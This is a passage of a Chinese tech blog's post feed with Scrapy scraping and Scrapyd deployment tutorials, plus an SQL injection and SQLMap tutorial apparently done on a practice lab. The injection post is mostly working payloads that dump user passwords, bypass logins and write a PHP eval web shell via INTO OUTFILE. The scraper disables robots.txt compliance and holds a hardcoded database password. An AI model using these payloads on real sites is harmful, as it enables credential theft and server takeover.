alt=""></p><pre><code>https://www.111.com.cn/product/50787275.htmlhttps://www.111.com.cn/product/50096190.htmlhttps://www.111.com.cn/product/50071493.htmlhttps://www.111.com.cn/product/51059448.html</code></pre><p>编写正则<br>    product/\d+.html</p><p>因为在药品详情页中药品价格是通过Js加载的,所以这里使用Scrapy-Splash进行JS渲染,然后再进行网页解析.</p><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/hu9n*YnOc4nVNSU7JnUd70cu9I0r4Gk9AfBoqPvGg3Q!/b/dL4AAAAAAAAA&amp;bo=hgW6AwAAAAADNyg!&amp;rf=viewer_4" alt=""></p><p>最后药品个各个分类中还有下一页,获取下一页的URL并交给SplashRequest处理</p><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/yV113Rd39DWhniLP3.RWgYbgeZ94VczE5gKu1cKb4V4!/b/dDQBAAAAAAAA&amp;bo=twZhAgAAAAADJ9A!&amp;rf=viewer_4" alt=""></p><pre><code> next_url = response.xpath(        &quot;//div[@id=&#39;search_table&#39;]/div[@class=&#39;turnPageBottom&#39;]/a[contains(@class,&#39;page_next&#39;)]/@href&quot;).extract_first()    if next_url:        next_url = &quot;https://&quot; + next_url[2:]        yield SplashRequest(url=next_url, callback=self.parse_item, args=self.splash_args, endpoint=&quot;render.html&quot;)    else:        print(f&quot;{response.url}没有下一页&quot;)</code></pre><h1 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h1><h2 id="主要爬虫代码"><a href="#主要爬虫代码" class="headerlink" title="主要爬虫代码"></a>主要爬虫代码</h2><p>爬取规则</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom scrapy_splash import SplashRequestfrom YaoPinSpider.items import YaopinspiderItemclass YaopinSpider(CrawlSpider):    name = &#39;YaoPin&#39;  # 爬虫名字    allowed_domains = [&#39;111.com.cn&#39;]  # 爬取的域    start_urls = [&#39;https://www.111.com.cn/categories/&#39;]  # 开始爬取的URL    # 抓取规则    rules = (        Rule(LinkExtractor(allow=r&#39;categories/\d{6}-j\d&#39;), callback=&quot;parse_next&quot;, follow=True),  # 匹配药品分类        Rule(LinkExtractor(allow=r&#39;product/\d+.html&#39;), callback=&quot;parse_item&quot;, follow=True)  # 匹配药品详情页面    )    splash_args = {        &quot;wait&quot;: 0.5,  # Splash执行完成之后会等待一段时间后返回    }    def parse_next(self, response):        # 下一页的处理        next_url = response.xpath(            &quot;//div[@id=&#39;search_table&#39;]/div[@class=&#39;turnPageBottom&#39;]/a[contains(@class,&#39;page_next&#39;)]/@href&quot;).extract_first()        if next_url:            next_url = &quot;https://&quot; + next_url[2:]            yield SplashRequest(url=next_url, callback=self.parse_item, args=self.splash_args, endpoint=&quot;render.html&quot;)        else:            print(f&quot;{response.url}没有下一页&quot;)    def parse_item(self, response):        &quot;&quot;&quot;        将CrawlSpider匹配的url交给Splash处理        :param response:        :return:        &quot;&quot;&quot;        url = response.url        yield SplashRequest(url=url, callback=self.parse_detail, args=self.splash_args, endpoint=&quot;render.html&quot;)    def parse_detail(self, response):        &quot;&quot;&quot;        解析Splash渲染完成之后的页面        :param response:        :return:        &quot;&quot;&quot;        items = YaopinspiderItem()  # 实例化item类        tr_list = response.xpath(&quot;//div[@class=&#39;goods_intro&#39;]/table/tbody&quot;)        for tr in tr_list:            drug_name = tr.xpath(&quot;./tr[1]/td/text()&quot;).extract_first()  # 药品名            brand = tr.xpath(&quot;./tr[2]/td[1]/text()&quot;).extract_first()  # 品牌            spec = tr.xpath(&quot;./tr[2]/td[2]/text()&quot;).extract_first()  # 规格            weight = tr.xpath(&quot;./tr[3]/td[1]/text()&quot;).extract_first()  # 重量            manufacturer = tr.xpath(&quot;./tr[3]/td[2]/text()&quot;).extract_first()  # 生产厂商            approval_num = tr.xpath(&quot;./tr[4]/td/text()&quot;).extract_first().strip().strip(&quot;(&quot;)  # 批准文号            items[&#39;drug_name&#39;] = drug_name            items[&#39;brand&#39;] = brand            items[&#39;spec&#39;] = spec            items[&#39;weight&#39;] = weight            items[&#39;manufacturer&#39;] = manufacturer            items[&#39;approval_num&#39;] = approval_num            # print_format = f&quot;药品名字:{drug_name},品牌:{brand},规格:{spec},重量:{weight},生产厂商:{manufacturer},批准文号:{approval_num}&quot;            # print(print_format)        price = response.xpath(            &quot;//div[@class=&#39;shangpin_info&#39;]/dl[@class=&#39;clearfix&#39;]/dd/span[@class=&#39;good_price&#39;]/text()&quot;).extract_first()  # 药品价格        # print(price)        items[&#39;price&#39;] = price        items[&quot;detail_url&quot;] = response.url        yield items</code></pre><h2 id="Items"><a href="#Items" class="headerlink" title="Items"></a>Items</h2><p>爬取字段</p><pre><code>import scrapyclass YaopinspiderItem(scrapy.Item):    drug_name = scrapy.Field()  # 药品名    brand = scrapy.Field()  # 品牌    spec = scrapy.Field()  # 规格    weight = scrapy.Field()  # 重量    manufacturer = scrapy.Field()  # 生产厂商    approval_num = scrapy.Field()  # 批准文号    price = scrapy.Field()  # 价格    detail_url = scrapy.Field()  # 详情页面Url</code></pre><h2 id="Pipelines"><a href="#Pipelines" class="headerlink" title="Pipelines"></a>Pipelines</h2><p>数据存储</p><pre><code>class MysqlPipeline(object):    &#39;&#39;&#39;    将数据保存到Mysql    这是同步的插入方式    这种方式当数据量过大的时候会引起阻塞    &#39;&#39;&#39;    def __init__(self):        self.conn = MySQLdb.connect(&#39;localhost&#39;, &#39;root&#39;, &#39;LiuChen0.&#39;, &#39;yaopindata&#39;, charset=&#39;utf8&#39;,                                    use_unicode=True)  # 数据库连接        self.cursor = self.conn.cursor()  # 获取游标    def process_item(self, item, spider):        insert_sql = &quot;&quot;&quot;                    insert into drug(drug_name,brand,spec,weight,manufacturer,approval_num,price,detail_url)                    values(%s,%s,%s,%s,%s,%s,%s,%s)                    &quot;&quot;&quot;        self.cursor.execute(insert_sql,                    (item[&#39;drug_name&#39;], item[&#39;brand&#39;], item[&#39;spec&#39;], item[&#39;weight&#39;], item[&#39;manufacturer&#39;],                        item[&#39;approval_num&#39;], item[&#39;price&#39;], item[&#39;detail_url&#39;]))        self.conn.commit()</code></pre><h2 id="settings"><a href="#settings" class="headerlink" title="settings"></a>settings</h2><pre><code>BOT_NAME = &#39;YaoPinSpider&#39;SPIDER_MODULES = [&#39;YaoPinSpider.spiders&#39;]NEWSPIDER_MODULE = &#39;YaoPinSpider.spiders&#39;USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0&#39;# Obey robots.txt rulesROBOTSTXT_OBEY = FalseDOWNLOAD_DELAY = 0.5# DEFAULT_REQUEST_HEADERS = {#   &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,#   &#39;Accept-Language&#39;: &#39;en&#39;,# }SPIDER_MIDDLEWARES = {    # &#39;YaoPinSpider.middlewares.YaopinspiderSpiderMiddleware&#39;: 543,    &#39;scrapy_splash.SplashDeduplicateArgsMiddleware&#39;: 100,}DOWNLOADER_MIDDLEWARES = {    &#39;scrapy_splash.SplashCookiesMiddleware&#39;: 723,    &#39;scrapy_splash.SplashMiddleware&#39;: 725,    &#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;: 810,    &quot;YaoPinSpider.middlewares.UserAgentDownloadMiddleware&quot;:400,}# EXTENSIONS = {#    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,# }# See https://doc.scrapy.org/en/latest/topics/item-pipeline.htmlITEM_PIPELINES = {    &quot;YaoPinSpider.pipelines.MysqlPipeline&quot;:300,}# 配置splashSPLASH_URL = &#39;http://0.0.0.0:8050/&#39;     # 阿里云服务器上的Splash地址# 去重过滤器DUPEFILTER_CLASS = &#39;scrapy_splash.SplashAwareDupeFilter&#39;# 使用ScrapyHttp缓存服务HTTPCACHE_STORAGE = &#39;scrapy_splash.SplashAwareFSCacheStorage&#39;MYSQL_HOST = &quot;数据库地址&quot;MYSQL_DBNAME = &quot;数据库名字&quot;MYSQL_USER = &quot;数据库用户名&quot;MYSQL_PASSWORD = &quot;数据库密码&quot;</code></pre><h2 id="scrapy-cfg"><a href="#scrapy-cfg" class="headerlink" title="scrapy.cfg"></a>scrapy.cfg</h2><p>配置scrapy.cfg将爬虫项目部署到远端爬虫服务器</p><pre><code>[settings]default = YaoPinSpider.settings[deploy:yaopin]url = http://0.0.0.0:6800/       # Spider Server Urlproject = YaoPinSpider      # Sprider Project</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用Scrapyd将爬虫部署到远程服务器</title>
      <link href="/2019/03/22/li-yong-scrapyd-jiang-pa-chong-bu-shu-dao-yuan-cheng-fu-wu-qi/"/>
      <url>/2019/03/22/li-yong-scrapyd-jiang-pa-chong-bu-shu-dao-yuan-cheng-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="远程服务器配置"><a href="#远程服务器配置" class="headerlink" title="远程服务器配置"></a>远程服务器配置</h1><h2 id="安装Scrapyd"><a href="#安装Scrapyd" class="headerlink" title="安装Scrapyd"></a>安装Scrapyd</h2><pre><code>1. 安装scrapyd    pip install scrapyd2. 服务器开启6800端口远程访问3. 修改scrapyd的Ip绑定    在default_scrapyd.conf文件中将bind_address修改为0.0.0.0        bind_address=0.0.0.0默认为127.0.0.14. 开启Scrapyd    shell下运行scrapyd</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><pre><code>浏览器中输入服务器的Ip地址如果能够正常访问则表示scrapyd配置成功</code></pre><p><img src="https://m.qpic.cn/psb?/V14KwPpr1dBZ4U/kut.F*J631wX9NhxW5SEdQtstrApCVarvV.f8R9xaLY!/b/dD4BAAAAAAAA&amp;bo=zgMfAgAAAAADB*I!&amp;rf=viewer_4" alt=""></p><h1 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h1><p>scrapyd-client:将本地scrapy项目打包发送到scrapyd的服务端</p><h2 id="安装Scrapyd-client"><a href="#安装Scrapyd-client" class="headerlink" title="安装Scrapyd-client"></a>安装Scrapyd-client</h2><pre><code>pip install scrapyd-client</code></pre><h2 id="修改scrapy配置文件"><a href="#修改scrapy配置文件" class="headerlink" title="修改scrapy配置文件"></a>修改scrapy配置文件</h2><p>在Scrapy项目目录下有一个叫scrapy.cfg的Scrapy配置文件.</p><pre><code>│  scrapy.cfg(Scrapy项目配置文件)│  setup.py│  start.py└─YangGuangGaoKao    │  items.py    │  middlewares.py    │  pipelines.py    │  settings.py(scrapy设置文件)    │  __init__.py    │    ├─spiders    │  │  IndexSpider.py(爬虫)    │  │  __init__.py    │    ├─utils    │      logger.py</code></pre><p>将scrapy.cfg文件修改成下面的这种格式</p><pre><code>- url是scrapyd服务器的URL地址- project是scrapyd的项目名字[settings]default = YangGuangGaoKao.settings[deploy:gaokao]url = http://0.0.0.0:6800/       # Spider Server Urlproject = YangGuangGaoKao</code></pre><p>切记scrapy.cfg文件中<strong>不能使用中文注释</strong></p><p>否则会报<strong>UnicodeDecodeError: ‘gbk’ codec can’t decode byte 0xae in position 175</strong></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>在scrapy.cfg的<strong>同级目录</strong>下运行<strong>scrapyd-deploy</strong>命令,如果在Windows下运行这个命令会报错找不到该命令.</p><p>解决方法:</p><pre><code>在自己的Python安装目录中找到Scripts目录这个目录中有个scrapyd-deploy文件,这个文件没有任何后缀,所以无法执行.在Scripts目录下新建一个scrapyd-deploy.bat文件</code></pre><p>写入下面的内容</p><pre><code>@echo off&quot;D:\Python36\python.exe&quot; &quot;D:\Python36\Scripts\scrapyd-deploy&quot; %1 %2 %3 %4 %5 %6 %7 %8 %9</code></pre><p><strong>D:\Python36\python.exe:Python.exe的路径</strong></p><p><strong>D:\Python36\Scripts\scrapyd-deploy:scrapy-deploy的路径</strong></p><p>执行<strong>scrapyd-deploy</strong></p><pre><code>L:\ScrapyProjectDemo\YangGuangGaoKao&gt;scrapyd-deployUnknown target: default</code></pre><p>如果控制台有这样的输出则表示scrapyd-deploy能够正常执行</p><p>将自己的爬虫项目部署到服务端</p><pre><code>scrapyd-deploy gaokao -p YangGuangGaoKao</code></pre><p><strong>gaokao</strong>:scrapy.cfg中的”deploy:gaokao”</p><p><strong>YangGuangGaoKao</strong>:scrapy.cfg中的project=YangGuangGaoKao</p><pre><code>L:\ScrapyProjectDemo\YangGuangGaoKao&gt;scrapyd-deploy gaokao -p YangGuangGaoKaoPacking version 1553244314Deploying to project &quot;YangGuangGaoKao&quot; in http://0.0.0.0:6800/addversion.jsonServer response (200):{&quot;node_name&quot;: &quot;iZ2ze8yfs65r3ciel5lbucZ&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;project&quot;: &quot;YangGuangGaoKao&quot;, &quot;version&quot;: &quot;1553244314&quot;, &quot;spiders&quot;: 3}</code></pre><p>这样就表示部署成功</p><p>这时候在服务器端会多两个文件夹<strong>dbs,eggs</strong>我的在home目录下不知道你们的在哪儿.</p><pre><code>root@iZ2ze8yfs65r3ciel5lbucZ:/home# lsdbs  eggs   twistd.pid</code></pre><h2 id="开启服务端的爬虫"><a href="#开启服务端的爬虫" class="headerlink" title="开启服务端的爬虫"></a>开启服务端的爬虫</h2><pre><code>curl http://0.0.0.0:6800/schedule.json -d project=YangGuangGaoKao -d spider=IndexSpiderYangGuangGaoKao:scrapyd项目名字IndexSpider:爬虫名字</code></pre><p>如果开启成功则在<strong>终端会显示</strong></p><pre><code>$ curl http://0.0.0.0:6800/schedule.json -d project=YangGuangGaoKao -d spider=IndexSpider    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current Dload  Upload   Total Spent Left  Speed100   144  100   102  100    42     81     33  0:00:01  0:00:01 --:--:--    81{&quot;                             node_name&quot;: &quot;iZ2ze8yfs65r3ciel5lbucZ&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;jobid&quot;: &quot;ba214a324c7f11e                             98c2700163e32604e&quot;}</code></pre><p>这时候我们访问我们服务端能够查看我们服务端部署的爬虫,以及运行日志</p><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/s7rWY3MODx.zDQdxptp3X14.AQM0sWtBw4ITj*w0Fxs!/b/dL8AAAAAAAAA&amp;bo=NwV6AQAAAAADF3s!&amp;rf=viewer_4" alt=""></p><p><a href="https://scrapyd.readthedocs.io/en/latest/" target="_blank" rel="noopener">官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL注入SQLMap的基本使用</title>
      <link href="/2019/03/20/sql-zhu-ru-sqlmap-de-ji-ben-shi-yong/"/>
      <url>/2019/03/20/sql-zhu-ru-sqlmap-de-ji-ben-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入常用相关函数"><a href="#SQL注入常用相关函数" class="headerlink" title="SQL注入常用相关函数"></a>SQL注入常用相关函数</h2><ol><li>@@version 数据库版本</li><li>@@basedir 数据库路径</li><li>length() 字符串长度</li><li>mid(arg1,arg2,arg3) 需要截取的字符串,arg1(需要截取的字符串),arg2(从第几位开始截取),arg3(截取长度)</li><li>database() 当前数据库的名字</li><li>@@version_compile_os 操作系统信息</li><li>substring() 截取字符</li><li>ord() 返回ASCII值</li><li>sleep() 睡眠指定的秒数</li><li>if() if判断</li><li>group_concat() 连接一组字符串,将查询结果放到同一行.</li></ol><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><pre><code>布尔类型and 1=2 --+字符型id=1&#39;</code></pre><h2 id="判断数据库中有多少字段"><a href="#判断数据库中有多少字段" class="headerlink" title="判断数据库中有多少字段"></a>判断数据库中有多少字段</h2><pre><code>order by 5</code></pre><h2 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h2><pre><code>union select 1,2,3 --+</code></pre><h2 id="查询数据库的名称和版本"><a href="#查询数据库的名称和版本" class="headerlink" title="查询数据库的名称和版本"></a>查询数据库的名称和版本</h2><p> union select 1,database(),version() –+</p><h2 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h2><pre><code>根据查询到的数据库名查询表名    (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7365637572697479)这里的**0x7365637572697479**是数据库**security**的16进制值</code></pre><h2 id="查询字段-1"><a href="#查询字段-1" class="headerlink" title="查询字段"></a>查询字段</h2><pre><code>根据刚刚查询到的数据库表的名字去查询表中的字段名字这里的**0x7573657273**表示user表的16进制值union select 1,database(),(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x7365637572697479 and TABLE_NAME=0x7573657273) --+</code></pre><h2 id="查字段中的数据"><a href="#查字段中的数据" class="headerlink" title="查字段中的数据"></a>查字段中的数据</h2><pre><code>union select 1,database(),(select group_concat(concat(username,&#39;89&#39;,password)) from users) --+</code></pre><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="利用updatexml-函数查询"><a href="#利用updatexml-函数查询" class="headerlink" title="利用updatexml()函数查询"></a>利用updatexml()函数查询</h2><pre><code>and updatexml(1,concat(&#39;^&#39;,(select version()),&#39;^&#39;),1) --+and updatexml(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;),1) --+</code></pre><h2 id="利用extractvalue-函数查询表"><a href="#利用extractvalue-函数查询表" class="headerlink" title="利用extractvalue()函数查询表"></a>利用extractvalue()函数查询表</h2><pre><code>and extractvalue(1,concat(&#39;^&#39;,((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7365637572697479)),&#39;^&#39;)) --+</code></pre><h2 id="查询表中的字段名"><a href="#查询表中的字段名" class="headerlink" title="查询表中的字段名"></a>查询表中的字段名</h2><pre><code>and extractvalue(1,concat(&#39;^&#39;,((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x7365637572697479 and table_name=0x7573657273)),&#39;^&#39;)) --+</code></pre><h2 id="查询字段内容"><a href="#查询字段内容" class="headerlink" title="查询字段内容"></a>查询字段内容</h2><pre><code>and extractvalue(1,concat(&#39;^&#39;,((select group_concat(concat(username,&#39;*&#39;,password)) from users)),&#39;*&#39;)) --+这种方式的查询显示的信息不全使用limit进行分页查询,第一个参数offset表示偏移量,也就是数据库中的行,第二个参数表示记录数and extractvalue(1,concat(&#39;^&#39;,((select concat(username,&#39;**&#39;,password) from users limit 0,1)),&#39;^&#39;)) --+and extractvalue(1,concat(&#39;^&#39;,((select concat(username,&#39;**&#39;,password) from users limit 1,1)),&#39;^&#39;)) --+and extractvalue(1,concat(&#39;^&#39;,((select concat(username,&#39;**&#39;,password) from users limit 3,1)),&#39;^&#39;)) --+</code></pre><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="判断数据库名字的长度"><a href="#判断数据库名字的长度" class="headerlink" title="判断数据库名字的长度"></a>判断数据库名字的长度</h2><pre><code> and length(database()) = 8 --+ and length(database()) = 10 --+length(database())数据库的长度如果长度为8则返回正确的页面,如果长度不为8则报错.</code></pre><h2 id="判断字段的第一个字母"><a href="#判断字段的第一个字母" class="headerlink" title="判断字段的第一个字母"></a>判断字段的第一个字母</h2><pre><code>mid()函数:需要截取的字符串长度and mid(database(),1,1) = &#39;a&#39; --+and mid(database(),1,1) = &#39;s&#39; --+如果数据库名字的第一个字母为s则返回正确的页面,如果不为s则返回错误的页面.第二种方法:使用ASCII值对数据库名字的第一个字母进行判断and ord(mid(database(),1,1)) &gt; 130 --+如果数据库名字的第一个字母的ASCII值在130以内则返回正确的页面,如果不在则返回错误的页面</code></pre><h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="根据时间判断数据库中的内容"><a href="#根据时间判断数据库中的内容" class="headerlink" title="根据时间判断数据库中的内容"></a>根据时间判断数据库中的内容</h2><pre><code>and if(ord(mid(database(),1,1))=101,sleep(4),1) --+and if(ord(mid(database(),1,1))&gt;110,sleep(4),1) --+and if(ord(mid(database(),1,1))=115,sleep(4),1) --+</code></pre><h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><h2 id="主动报错根据报错信息进行分析"><a href="#主动报错根据报错信息进行分析" class="headerlink" title="主动报错根据报错信息进行分析"></a>主动报错根据报错信息进行分析</h2><pre><code>uname=test&#39;&amp;passwd=test</code></pre><h2 id="永真条件测试-加注释"><a href="#永真条件测试-加注释" class="headerlink" title="永真条件测试,加注释(#)"></a>永真条件测试,加注释(#)</h2><pre><code>uname=test&#39; or 1=1 #&amp;passwd=test</code></pre><h2 id="闭合单引号注入"><a href="#闭合单引号注入" class="headerlink" title="闭合单引号注入"></a>闭合单引号注入</h2><pre><code>uname=test&#39; or &#39;1&#39;=1&amp;passwd=test       注入失败,因为此条语句的查询方式为select username,password from users where username=&#39;test&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;test&#39;;在这条语句中and的优先级比or的高,那么&#39;1&#39;=&#39;1&#39; and password=&#39;test&#39;先执行,又因为password字段中没有&#39;test&#39;值,所以右边为false,那么最终语句就会变成select username,password from users where username=&#39;test&#39; or false;uname=test&amp;passwd=test&#39; or &#39;1&#39;=&#39;1</code></pre><h2 id="查看有几个字段"><a href="#查看有几个字段" class="headerlink" title="查看有几个字段"></a>查看有几个字段</h2><pre><code>uname=test&amp;passwd=test&#39; order by 3 #</code></pre><h2 id="查看相关信息"><a href="#查看相关信息" class="headerlink" title="查看相关信息"></a>查看相关信息</h2><pre><code>uname=test&amp;passwd=test&#39; union select database(),user()#</code></pre><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><pre><code>通过id进行传值?id=1&#39;?id=1%df&#39;1(31)%df(fd5c)&#39;(c27)?id=-1%df%27%20union%20select%201,2,3%20--+</code></pre><h1 id="SQL注入的读写操作"><a href="#SQL注入的读写操作" class="headerlink" title="SQL注入的读写操作"></a>SQL注入的读写操作</h1><pre><code>读操作,使用load_file()函数union select 1,load_file(&#39;D:\\phpStudy\\www.\\sqli\\less-1\\123.txt&#39;),3 --+写操作,使用outfile &quot;&quot;union select 1,&quot;&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,3 into outfile &quot;C:/xampp/htdocs/777.php&quot;%20 --+</code></pre><h1 id="SQLMap的基本使用"><a href="#SQLMap的基本使用" class="headerlink" title="SQLMap的基本使用"></a>SQLMap的基本使用</h1><h2 id="判断当前数据库"><a href="#判断当前数据库" class="headerlink" title="判断当前数据库"></a>判断当前数据库</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/QkY2r7shu12dFfFLSSs84Xt09l2kUKZ4FAFXRunEOKs!/b/dLYAAAAAAAAA&amp;bo=sQY.AwAAAAADB6g!&amp;rf=viewer_4" alt="&quot;当前数据库&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/cZ2sa4BRnAgaSrRYgoFe3faY18NX7y4TEuTN9zactIM!/b/dLkAAAAAAAAA&amp;bo=pQY8AwAAAAADF64!&amp;rf=viewer_4" alt="&quot;当前数据库&quot;"></p><h2 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/.O1rVUrgitpGGU4YbxOARcuwu05XJIFCECc38O8uonw!/b/dDQBAAAAAAAA&amp;bo=pgbRAQAAAAADB1I!&amp;rf=viewer_4" alt="&quot;列出所有数据库&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/9Y2OkZupmAK0PBdygr9Hl3K.yMmXNZaNL19yaH*YW44!/b/dLkAAAAAAAAA&amp;bo=nAUNAgAAAAADF6Q!&amp;rf=viewer_4" alt="&quot;列出所有数据库&quot;"></p><h2 id="通过数据库得到表名"><a href="#通过数据库得到表名" class="headerlink" title="通过数据库得到表名"></a>通过数据库得到表名</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/99DKEaO9mynkvRpCkztLGlQNJpV1RaYnImikDBxYvIE!/b/dL8AAAAAAAAA&amp;bo=pwb9AQAAAAADB38!&amp;rf=viewer_4" alt="&quot;通过数据库名字得到表名"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/LVHzh1eZDOJPVv.aFIeqnULsEXpsRy*WKv7zw*h*FVs!/b/dDABAAAAAAAA&amp;bo=rwViAgAAAAADB.g!&amp;rf=viewer_4" alt="&quot;通过数据库名字得到表名"></p><h2 id="通过表名得到字段名"><a href="#通过表名得到字段名" class="headerlink" title="通过表名得到字段名"></a>通过表名得到字段名</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/OASC4eUssgThaNMvHrVyXAFMVmgdART0EsrnEtvpc5k!/b/dFIBAAAAAAAA&amp;bo=sgYnAgAAAAADB7M!&amp;rf=viewer_4" alt="&quot;得到字段名&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/6HVCbDJ5P.W7IcqCxSJ.zAlzyIiDgx64p652hGaNcEo!/b/dLgAAAAAAAAA&amp;bo=PAScAgAAAAADB4Q!&amp;rf=viewer_4" alt="&quot;得到字段名&quot;"></p><h2 id="通过表字段得到字段的值"><a href="#通过表字段得到字段的值" class="headerlink" title="通过表字段得到字段的值"></a>通过表字段得到字段的值</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/PaAlqrv94KQEjJcS8pE9Ov8TGURzE3FpSa1PITEZSP4!/b/dDUBAAAAAAAA&amp;bo=nwbTAgAAAAADB2o!&amp;rf=viewer_4" alt="&quot;得到字段的值&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/urrusXE1LpcEWWYZj1zHZWhaCD1IEmv8VV5*QUTbyGU!/b/dDEBAAAAAAAA&amp;bo=OAQ8AgAAAAADFzA!&amp;rf=viewer_4" alt="&quot;得到字段的值&quot;"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scrapy爬取汽车之家精选高清大图</title>
      <link href="/2019/02/19/scrapy-pa-qu-qi-che-zhi-jia-jing-xuan-gao-qing-da-tu/"/>
      <url>/2019/02/19/scrapy-pa-qu-qi-che-zhi-jia-jing-xuan-gao-qing-da-tu/</url>
      
        <content type="html"><![CDATA[<p>好久没写爬虫,今天算是复习下Scrapy,正所谓温故而知新.</p><p>这次爬取的目标网站是汽车之家的精选高清大图.</p><p>先看看运行结果吧</p><p><img src="http://b290.photo.store.qq.com/psb?/V10Lajvl04D7qQ/VWZf9yEkhXVMGAb0GRYfh6ZSTBi1ssJ.1XCqqsEMzts!/b/dCIBAAAAAAAA&amp;bo=EgLGAhICxgIBACc!&amp;rf=viewer_311" alt=""></p><p><img src="http://a2.qpic.cn/psb?/V10Lajvl04D7qQ/SMq7ob3LXMn4bNABWRoVq9slSJAAjmtakpj9jp*WO90!/b/dCEAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=2QKmA9kCpgMBACc!&amp;tl=1&amp;vuin=726301387&amp;tm=1550628000&amp;sce=50-1-1&amp;rf=viewer_311" alt=""></p><p><img src="http://a2.qpic.cn/psb?/V10Lajvl04D7qQ/u4oGnx1XvV9VA5H2YGNsXaeos2r86BdZImSXDwHNJWQ!/b/dC0AAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=UwXuA1MF7gMBACc!&amp;tl=1&amp;vuin=726301387&amp;tm=1550628000&amp;sce=50-1-1&amp;rf=viewer_311" alt=""></p><h1 id="页面分析"><a href="#页面分析" class="headerlink" title="页面分析"></a>页面分析</h1><p>下面我们来分析一下图片精选页面</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/yhJteiFadlHCYQqOskFM.kLi0nGC9fpkdyOar5jeXjM!/b/dFQBAAAAAAAA&amp;bo=UAbdA1AG3QMDByI!&amp;rf=viewer_4" alt="1"></p><p>这个页面中全部都是套图,我们打开某一套图进行查看.</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/Zq4sxEk8g1LLNwycqoIhzG9bJyeVmILolNHr1O4Hm9g!/b/dLwAAAAAAAAA&amp;bo=aQdqA2kHagMDV3I!&amp;rf=viewer_4" alt="2"></p><p>一开始我想从这个页面获取高清大图,无奈这些高清大图在页面源码中没有😔.</p><p>最后右上角发现了一个<strong>列表模式</strong></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/SWjcrhLWxpHeILbZfa8fXXbgBHr1eSCzc9pCYapvc1Y!/b/dDUBAAAAAAAA&amp;bo=3gbMA94GzAMDZ0I!&amp;rf=viewer_4" alt="列表"></p><p>列表模式显示的都是一些缩略图,那么怎么把缩略图变成高清大图呢?</p><p><img 